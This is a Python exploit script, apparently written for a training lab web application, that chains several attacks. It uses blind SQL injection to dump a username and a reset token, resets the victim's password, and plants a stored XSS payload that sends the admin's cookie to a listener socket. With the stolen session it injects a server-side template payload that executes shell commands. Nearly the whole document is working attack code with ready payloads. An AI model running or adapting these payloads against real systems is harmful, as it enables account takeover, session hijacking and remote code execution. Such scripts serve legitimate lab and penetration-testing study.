"""
1. SQLi Dump Username & Token
2. XSS
3. SSTI
note: ntah kenapa reset passwordnya ga generate token, tapi sebelumnya berhasil
"""
import requests, argparse, sys, socket, re

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='URL Target', required=True)
parser.add_argument('-p','--passwd', help='Password', required=True)
args = parser.parse_args()

http_proxy = "http://127.0.0.1:8080"
proxyDict = {
            "http" : http_proxy
        }
s = requests.session()

def req_token(target, username):
    print("\n[i] Request Token from Forgot Username")
    url = f"http://{target}/forgotusername.php"
    header = {"Content-Type":"application/x-www-form-urlencoded"}
    data = f"username={username}"
    requests.post(url, headers=header, data=data, proxies=proxyDict)
    print('[+] Done Request Token')

def res_pass(target, token, password):
    url = f"http://{target}/resetpassword.php"
    header = {"Content-Type":"application/x-www-form-urlencoded"}
    data = f"token={token}&password1={password}&password2={password}"
    r = requests.post(url, headers=header, data=data, proxies=proxyDict)
    if "Password changed!" in r.text:
        print(f"[+] Success change password to: {password}")
    else:
        print("[-] Hhmm, failed to change password")

def sqli_forgotuname(target, inj):
    for i in range(32, 126): # ASCII CHAR Range 32-126
        url = f"http://{target}/forgotusername.php"
        header = {"Content-Type":"application/x-www-form-urlencoded"}
        data = "username=%s" % inj.replace("[CHAR]", str(i))
        r = requests.post(url, headers=header, data=data, proxies=proxyDict)
        cl = int(r.headers['Content-Length'])
        if (cl < 1480): # Valid Username => Content Length: 1477
            return i
    return None

def sqlinject(target, r, inj):
    exval = ""
    for i in range(1, r):
        inj_str = "test'+or+(ascii(substring((%s),%d,1)))=[CHAR]+limit+1;--" % (inj, i)
        uvalue = sqli_forgotuname(target, inj_str)
        if uvalue:
            exval += chr(uvalue)
            exval_char = chr(uvalue)
            sys.stdout.write(exval_char)
            sys.stdout.flush()
        else:
            print("\n[+] Success dump!")
            break
    return exval

def login(target, uname, passwd):
    print("[i] Login with changed credentials")
    url = f"http://{target}/login.php"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"username={uname}&password={passwd}"
    r = s.post(url, headers=header, data=data, proxies=proxyDict, allow_redirects=False)
    if (r.status_code == 302):
        print("[+] Login successful!")
    else:
        print("[-] Login failed :-(")
        sys.exit(-1)

def xss(target, ip, port):
    print("[+] Injecting XSS in Description Field")
    url = f"http://{target}/profile.php"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    xss_payload = f'<img src=x onerror="this.src=\'http://{ip}:{port}/?\'%2bdocument.cookie; this.removeAttribute(\'onerror\');">'
    data = f"description={xss_payload}"
    print(data)
    r = s.post(url, headers=header, data=data, proxies=proxyDict)
    if "Success" in r.text:
        print("[+] XSS Injected")
    else:
        print("[-] Failed")

def setup_socket(ip, port):
    print("[+] Setting up socket to receive cookie")
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ip, port))
    sock.listen()

    print("[i] Waiting for admin to trigger XSS")
    (sock_c, ip_c) = sock.accept()
    get_request = sock_c.recv(4096)
    admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")
    print("[+] Captured admin cookie")
    admin_cookie = re.search(b'PHPSESSID=([^&\s]+)', get_request)
    admin_cookie = admin_cookie.group(1).decode('UTF-8')
    print("=> " + admin_cookie)
    return admin_cookie

def set_motd(target, sessid):
    print("[+] Injecting SSTI to MOTD")
    url = f"http://{target}/admin/update_motd.php"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    ssti_payload = "{php}echo+`echo+'pwned'+>+/tmp/pwned.txt`;{/php}\r\n{php}echo+`cat+/tmp/pwned.txt`{/php}"
    data = f"message={ssti_payload}"
    cookie = {'PHPSESSID': sessid}
    print(cookie)
    r = requests.post(url, headers=header, cookies=cookie, data=data, proxies=proxyDict, allow_redirects=True)
    if 'Message set!' in r.text:
        print("[+] SSTI injected")
    else:
        print("[-] Failed")

def trigger_ssti(target, sessid):
    print("[+] Trigerring SSTI")
    url = f"http://{target}/"
    cookie = {'PHPSESSID': sessid}
    r = requests.get(url, cookies=cookie)
    print("[+] Done")

def main():
    try:
        target = args.target
        password = args.passwd
    except IndexError:
        print("[i] Usage: python3 %s -t TARGET -p PASSWORD" % sys.argv[0])
        print("[i] ex: python3 %s -t 127.0.0.1:8000 -p pwned" % sys.argv[0])
    
    print("\n[i] Dumping username using SQLi")
    query_uname = "select+username+from+users+where+uid=2"
    username = sqlinject(target, 10, query_uname)

    req_token(target, username)

    print(f"\n[i] Dumping Token for {username}")
    query_token = "select+token+from+tokens+where+uid=2+limit+1"
    token = sqlinject(target, 33, query_token)

    print(f"\n[i] Resetting Password for {username}")
    res_pass(target, token, password)

    login(target, username, password)
    xss(target, '127.0.0.1', 5155)
    sessid = setup_socket('127.0.0.1', 5155)
    set_motd(target, sessid)
    trigger_ssti(target,sessid)

if __name__ == "__main__":
    main()
